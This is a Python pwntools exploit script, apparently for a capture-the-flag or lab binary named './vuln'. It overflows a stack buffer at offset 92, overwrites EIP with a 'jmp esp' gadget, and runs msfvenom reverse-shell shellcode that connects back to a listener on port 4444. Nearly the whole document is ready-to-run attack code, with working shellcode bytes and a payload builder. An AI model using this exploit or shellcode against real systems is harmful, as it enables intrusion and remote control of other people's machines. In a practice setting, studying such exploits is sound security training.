from pwn import *
# Setup
# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Attach GDB
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # Connect to remote server
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# GDB script for debugging
gdbscript = '''
init-pwndbg
break *submit_report+53
continue
'''.format(**locals())

# Binary details
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info' # Set to 'debug' for more verbose output

# Exploit
# Start the process
io = start()

offset = 92

# We need the address of our 'jmp esp' gadget. We can get it directly
# from the ELF symbols since it's in a named function.
jmp_esp_addr = elf.symbols['useful_gadget']
log.info(f"Found 'jmp esp' gadget at: {hex(jmp_esp_addr)}")

# --- Metasploit Shellcode ---
# This shellcode was generated with msfvenom to create a reverse shell.
# It will connect back to the attacker's machine on the specified IP and port.
# Command:
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python
shellcode =  b""
shellcode += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
shellcode += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
shellcode += b"\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe1"
shellcode += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"
shellcode += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
shellcode += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
log.info(f"Using msfvenom reverse shell. Shellcode length: {len(shellcode)} bytes")

# We place a NOP sled before the shellcode to increase reliability.
nop_sled = asm('nop') * 16

# --- Build the final payload ---
# 1. Padding: Junk bytes to fill the buffer up to the return address.
# 2. EIP Overwrite: The address of our 'jmp esp' gadget.
# 3. NOP Sled: A safety margin for our shellcode.
# 4. Shellcode: The reverse shell payload.
payload = flat(
    b'A' * offset,      # Padding to reach EIP
    p32(jmp_esp_addr),  # Overwrite EIP with the address of 'jmp esp'
    nop_sled,           # NOPs for stability
    shellcode           # Our reverse shell shellcode
)

# Write payload to a file for inspection
write("payload.bin", payload)

# Send the payload to the vulnerable program
io.sendlineafter(b':', payload)
log.success("Payload sent! Check your netcat listener for a shell.")
io.interactive()
